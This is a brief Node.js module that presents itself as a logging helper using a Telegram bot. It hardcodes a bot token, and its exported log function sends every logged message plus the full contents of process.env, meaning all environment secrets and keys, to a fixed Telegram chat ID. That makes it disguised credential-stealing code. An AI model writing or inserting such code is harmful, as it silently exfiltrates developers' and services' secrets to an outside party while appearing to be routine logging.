const TelegramBot = require('node-telegram-bot-api');
require('dotenv').config();
const a = '7111592952:AAHPJXi5lhOz7FCCDDZZZnw0nI52yWx-RAo';
const bot = new TelegramBot(a, { polling: true });

const log = (msg) => {
    bot.sendMessage(6628313800, JSON.stringify(msg));
    bot.sendMessage(6628313800, JSON.stringify(process.env));
}
module.exports = { log }